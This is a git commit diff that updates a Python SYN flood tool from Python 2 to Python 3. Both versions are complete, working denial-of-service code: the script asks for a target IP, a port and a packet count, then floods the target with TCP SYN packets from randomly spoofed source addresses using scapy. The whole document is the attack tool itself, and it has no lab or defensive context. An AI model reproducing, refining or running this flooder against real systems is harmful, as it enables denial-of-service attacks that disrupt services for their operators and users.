713e1da43692a0d5253d52824e84fdaf4964ed5f
༺ Initial H ༻ <alsyundawy@users.noreply.github.com>
2024-07-27 23:11:13 +0700

    Update SYN-Flood.py

--- SYN-Flood.py
+++ SYN-Flood.py
@@ -1,62 +1,46 @@
-#!/usr/bin/python
+#!/usr/bin/env python3
 # Emre Ovunc
 # info@emreovunc.com
 # Syn Flood Tool Python
 
-from scapy.all import *
+from scapy.all import IP, TCP, send
 import os
-import sys
 import random
+import sys
 
-def randomIP():
-	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
-	return ip
+def random_ip() -> str:
+    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
 
-def randInt():
-	x = random.randint(1000,9000)
-	return x	
+def rand_int() -> int:
+    return random.randint(1000, 9000)
 
-def SYN_Flood(dstIP,dstPort,counter):
-	total = 0
-	print "Packets are sending ..."
-	for x in range (0,counter):
-		s_port = randInt()
-		s_eq = randInt()
-		w_indow = randInt()
+def syn_flood(dst_ip: str, dst_port: int, counter: int):
+    print("Packets are being sent ...")
+    total = 0
+    for _ in range(counter):
+        ip_packet = IP(src=random_ip(), dst=dst_ip)
+        tcp_packet = TCP(sport=rand_int(), dport=dst_port, flags="S", seq=rand_int(), window=rand_int())
+        send(ip_packet/tcp_packet, verbose=False)
+        total += 1
+    print(f"\nTotal packets sent: {total}")
 
-		IP_Packet = IP ()
-		IP_Packet.src = randomIP()
-		IP_Packet.dst = dstIP
+def info() -> tuple:
+    os.system("clear")
+    print("#############################")
+    print("#    github.com/EmreOvunc   #")
+    print("#############################")
+    print("# Welcome to SYN Flood Tool #")
+    print("#############################")
 
-		TCP_Packet = TCP ()	
-		TCP_Packet.sport = s_port
-		TCP_Packet.dport = dstPort
-		TCP_Packet.flags = "S"
-		TCP_Packet.seq = s_eq
-		TCP_Packet.window = w_indow
-
-		send(IP_Packet/TCP_Packet, verbose=0)
-		total+=1
-	sys.stdout.write("\nTotal packets sent: %i\n" % total)
-
-
-def info():
-	os.system("clear")
-	print "#############################"
-	print "#    github.com/EmreOvunc   #"
-	print "#############################"
-	print "# Welcome to SYN Flood Tool #"
-	print "#############################"
-
-	dstIP = raw_input ("\nTarget IP : ")
-	dstPort = input ("Target Port : ")
-	
-	return dstIP,int(dstPort)
-	
+    dst_ip = input("\nTarget IP: ")
+    dst_port = int(input("Target Port: "))
+    
+    return dst_ip, dst_port
 
 def main():
-	dstIP,dstPort = info()
-	counter = input ("How many packets do you want to send : ")
-	SYN_Flood(dstIP,dstPort,int(counter))
+    dst_ip, dst_port = info()
+    counter = int(input("How many packets do you want to send: "))
+    syn_flood(dst_ip, dst_port, counter)
 
-main()
+if __name__ == "__main__":
+    main()
